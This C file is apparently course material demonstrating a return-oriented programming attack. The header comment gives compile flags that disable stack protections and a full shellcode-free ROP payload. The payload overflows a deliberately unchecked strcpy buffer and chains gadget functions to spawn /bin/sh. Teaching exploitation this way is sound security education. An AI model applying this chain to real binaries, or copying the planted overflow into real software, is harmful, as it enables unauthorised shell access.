/*
 * ROP example
 * (c) Elias Athanasopoulos, athanasopoulos.elias@cy.ac.cy 
 * Michalis Papaevripides,  mpapae04@cs.ucy.ac.cy
 * 
 * Compile the attached C program.
 * $ gcc -Wall -no-pie -fno-pic -m32 -fno-stack-protector rop.c -o rop
 * 
 * Run the program. 
 * ./rop `printf  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08\x2f\x62\x69\x6e\x24\xa0\x04\x08\xe0\x84\x04\x08\xce\x84\x04\x08\x2f\x2f\x73\x68\x28\xa0\x04\x08\xe0\x84\x04\x08\xcf\x84\x04\x08\x24\xa0\x04\x08\xd7\x84\x04\x08\xf2\x84\x04\x08\xfb\x84\x04\x08\x04\x85\x04\x08\x0d\x85\x04\x08"`

 * For the description of the ROP chain refer to the accompanied slide (rop.pdf).
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int password_valid = 0;

/* All functions below correspond to gadgets g1, g2, etc. See the related slide. */

void f1(void) {
   asm("pop %eax");
   asm("pop %ebx");
   asm("ret");
}

void f2(void) {
   asm("xor %eax, %eax");
   asm("ret");   
}

void f3(void) {
   asm("mov %eax, (%ebx)");
   asm("ret");
}

void f4(void) {
   asm("mov %eax, %ebx");
   asm("ret");
}

void f5(void) {
   asm("xor %ecx, %ecx");
   asm("ret");
}

void f6(void) {
   asm("xor %edx, %edx");
   asm("ret");
}

void f7(void) {
   asm("mov $0xb, %al");
   asm("ret");
}

void f8(void) {
   asm("int $0x80");
   asm("ret");
}

void authenticate_root(char *passwd) {
	unsigned long marker = 0xdeadbeef;
	char password[16];

	strcpy(password, passwd);

	fprintf(stderr, "%p\n", &marker);
	fprintf(stderr, "Validating password: %s\n", password);

	if (!strcmp(password, "e5ce4db216329f4f")) 
		password_valid = marker;

}

int main(int argc, char *argv[]) {

    if (argc > 1) {
	   authenticate_root(argv[1]);
    }

	if (password_valid != 0) {
		printf("Welcome administrator.\n");
	} else {
		printf("Access denied.\n");
	}

	return 1;
}
